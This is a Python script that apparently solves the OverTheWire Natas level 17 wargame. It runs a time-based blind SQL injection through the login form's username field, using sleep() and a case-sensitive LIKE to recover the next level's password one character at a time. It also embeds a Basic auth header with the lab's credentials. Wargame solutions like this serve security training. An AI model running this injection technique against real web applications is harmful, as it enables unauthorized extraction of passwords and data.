
import requests
import time


all_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

found = False

# Collate latin1_general_cs is used to make LIKE case sensitive
# SQL injection
query = 'natas18" and password COLLATE latin1_general_cs like "{}%" and sleep(3) and "1" = "1'

header = {
    "Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
}


pswd = []


while found is False:
    new_char = False
    for char in all_char:
        # Try all charcters (int, uppercase and lowercase)
        tmp = "".join(pswd) + char

        start_time = time.time()
        # Make a request with the password injected in the username.
        res = requests.post(url="http://natas17.natas.labs.overthewire.org/index.php?debug", data={
            "username": query.format(tmp)
        }, headers=header)
        
        time_diff = time.time() - start_time
        if time_diff >= 1:
            # if the substring password matches, then we append the found new char to the result
            new_char = True
            pswd.append(char)
            print("".join(pswd))
            break
    # If it has been found a character, then continue. Otherwise it means that the password has finished.
    if new_char is True:
        found = False
    else:
        found = True

print ("The password is \n{}".format("".join(pswd)))
    


    

